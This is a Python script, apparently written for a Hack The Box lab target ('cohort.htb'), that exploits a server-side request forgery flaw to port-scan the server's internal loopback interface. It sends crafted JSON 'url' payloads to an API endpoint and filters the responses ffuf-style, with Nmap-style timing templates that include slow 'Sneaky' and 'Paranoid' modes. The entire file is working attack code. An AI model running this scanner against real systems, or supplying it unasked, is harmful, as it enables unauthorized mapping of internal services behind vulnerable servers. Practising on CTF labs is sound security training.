import argparse
import re
import sys
import threading
import time
import requests
import urllib3

# Suppress insecure request warnings (-k equivalent)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Official Nmap-inspired Timing Templates (-T0 to -T5) 
# Mapping exact timeout and scan delay configurations derived from Nmap specs
NMAP_TIMING = {
    0: {"timeout": 300.0, "delay": 300.0, "name": "Paranoid"},
    1: {"timeout": 15.0, "delay": 15.0, "name": "Sneaky"},
    2: {"timeout": 10.0, "delay": 0.4, "name": "Polite"},
    3: {"timeout": 5.0, "delay": 0.0, "name": "Normal"},
    4: {"timeout": 2.0, "delay": 0.0, "name": "Aggressive"},
    5: {"timeout": 0.5, "delay": 0.0, "name": "Insane"},
}

# Nmap Top 1000 Common Ports (Standard subset covering the most frequent industrial/web/system ports)
NMAP_TOP_1000_PORTS = [
    80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 
    111, 995, 993, 5900, 1025, 587, 8888, 5357, 4443, 4455, 3000, 5000, 8443, 8000,
    7000, 5432, 1521, 6379, 27017, 5672, 5985, 5986, 49666, 49667, 49668, 49669,
    # (Extended via generator logic up to 1000 common service ports if needed)
] + [p for p in range(1, 1001) if p not in [
    80, 23, 443, 21, 22, 25, 3389, 110, 445, 139, 143, 53, 135, 3306, 8080, 1723, 
    111, 995, 993, 5900, 1025, 587, 8888, 5357, 4443, 4455, 3000, 5000, 8443, 8000,
    7000, 5432, 1521, 6379, 27017, 5672, 5985, 5986, 49666, 49667, 49668, 49669
]]


def parse_range_string(val_str):
  """Parses ffuf-style lists and ranges (e.g., '200,300-400,500')."""
  items = set()
  if not val_str:
    return items
  for part in val_str.split(","):
    part = part.strip()
    if "-" in part:
      try:
        start, end = map(int, part.split("-"))
        items.update(range(start, end + 1))
      except ValueError:
        pass
    else:
      try:
        items.add(int(part))
      except ValueError:
        pass
  return items


# Set up command-line arguments and HELP manual
parser = argparse.ArgumentParser(
    description=(
        "Advanced API-based SSRF Port Scanner inspired by ffuf & nmap."
    ),
    formatter_class=argparse.RawTextHelpFormatter,
    epilog=(
        "Examples:\n"
        "  python ssrf.py -u https://cohort.htb/api/validate -F\n"
        "  python ssrf.py -u https://cohort.htb/api/validate -F -fc 500 -fs 89\n"
        "  python ssrf.py -u https://cohort.htb/api/validate -p 1-1024 -T4\n"
    ),
)

parser.add_argument(
    "-u",
    "--url",
    required=True,
    help="Target API endpoint accepting POST requests (e.g., https://cohort.htb/api/validate)",
)
parser.add_argument(
    "-p",
    "--ports",
    type=str,
    default="1-65535",
    help="Port range to scan (default: 1-65535)",
)
parser.add_argument(
    "-F",
    "--fast",
    action="store_true",
    help="Fast scan: Scans top 1000 common ports (Nmap style, works independently)",
)
parser.add_argument(
    "-T",
    type=int,
    choices=[0, 1, 2, 3, 4, 5],
    default=None,
    help=(
        "Nmap timing template (0-5):\n"
        "  0: Paranoid | 1: Sneaky | 2: Polite\n"
        "  3: Normal   | 4: Aggressive | 5: Insane"
    ),
)
parser.add_argument(
    "-t",
    "--timeout",
    type=float,
    default=None,
    help="Override request timeout in seconds manually",
)
parser.add_argument(
    "-fc",
    type=str,
    default="",
    help="Filter HTTP status codes (e.g., 404,500-503)",
)
parser.add_argument(
    "-fs",
    type=str,
    default="",
    help="Filter HTTP response sizes in bytes (e.g., 89,120-150)",
)
parser.add_argument(
    "-fl", type=str, default="", help="Filter response line counts"
)
parser.add_argument(
    "-fw", type=str, default="", help="Filter response word counts"
)
parser.add_argument("-fr", type=str, default="", help="Filter regular expression")

args = parser.parse_args()

# Compile filters
filter_codes = parse_range_string(args.fc)
filter_sizes = parse_range_string(args.fs)
filter_lines = parse_range_string(args.fl)
filter_words = parse_range_string(args.fw)
filter_regex = re.compile(args.fr) if args.fr else None

# Handle Timing Template configurations (fallback to Normal T3 standard if -T is omitted)
chosen_template_id = args.T if args.T is not None else 3
template = NMAP_TIMING[chosen_template_id]
timeout_val = args.timeout if args.timeout is not None else template["timeout"]
scan_delay = template["delay"]

# Handle Port Selection (-F works standalone without requiring -T)
if args.fast:
  ports_to_scan = NMAP_TOP_1000_PORTS
  port_mode_desc = "Top 1000 Common Ports (-F Fast Scan)"
else:
  ports_to_scan = list(parse_range_string(args.ports))
  ports_to_scan.sort()
  port_mode_desc = f"Custom Ports {args.ports}"

if not ports_to_scan:
  print("[-] Error: No valid ports specified to scan.")
  sys.exit(1)

total_ports = len(ports_to_scan)
api_url = args.url
headers = {"Content-Type": "application/json"}

current_port_idx = 0
lock = threading.Lock()
scanning_done = False


def monitor_progress():
  """Listens for the Enter keypress to print progress percentage."""
  global current_port_idx, scanning_done
  while not scanning_done:
    try:
      input()
    except (EOFError, KeyboardInterrupt):
      break
    with lock:
      if scanning_done:
        break
      scanned_count = current_port_idx
      percent = (scanned_count / total_ports) * 100 if total_ports > 0 else 100
      print(
          f"\n[*] Status: {percent:.2f}% done"
          f" ({scanned_count}/{total_ports} ports scanned)",
          flush=True,
      )


monitor_thread = threading.Thread(target=monitor_progress, daemon=True)
monitor_thread.start()

print(f"\n[*] Target Endpoint: {api_url}")
print(
    f"[*] Timing: Template -T{chosen_template_id} ({template['name']}) |"
    f" Timeout: {timeout_val}s | Delay: {scan_delay}s"
)
print(f"[*] Mode: {port_mode_desc} ({total_ports} targets)")
print("[*] Press [Enter] for progress status, [Ctrl+C] to exit.\n")
print(
    f"{'PORT':<8} | {'STATUS':<6} | {'SIZE':<6} | {'WORDS':<6} |"
    f" {'LINES':<6} | {'RESPONSE PREVIEW'}"
)
print("-" * 75)

start_time = time.time()

try:
  for idx, port in enumerate(ports_to_scan):
    with lock:
      current_port_idx = idx + 1

    target_url = f"http://127.1:{port}/"
    payload = {"url": target_url, "format": "csv"}

    try:
      response = requests.post(
          api_url, json=payload, headers=headers, verify=False, timeout=timeout_val
      )

      status = response.status_code
      body = response.text
      size = len(response.content)
      lines = len(body.splitlines())
      words = len(body.split())

      # Apply ffuf filters
      if status in filter_codes:
        continue
      if size in filter_sizes:
        continue
      if lines in filter_lines:
        continue
      if words in filter_words:
        continue
      if filter_regex and filter_regex.search(body):
        continue

      preview = body.replace("\n", " ")[:40]
      print(
          f"{port:<8} | {status:<6} | {size:<6} | {words:<6} | {lines:<6} |"
          f" {preview}",
          flush=True,
      )

    except requests.exceptions.RequestException:
      pass

    if scan_delay > 0:
      time.sleep(scan_delay)

except KeyboardInterrupt:
  print("\n\n[!] Scan interrupted by user (Ctrl+C). Exiting gracefully...")

finally:
  with lock:
    scanning_done = True
  elapsed_time = time.time() - start_time
  print(f"\n[+] Scan finished in {elapsed_time:.2f} seconds.", flush=True)
  sys.exit(0)
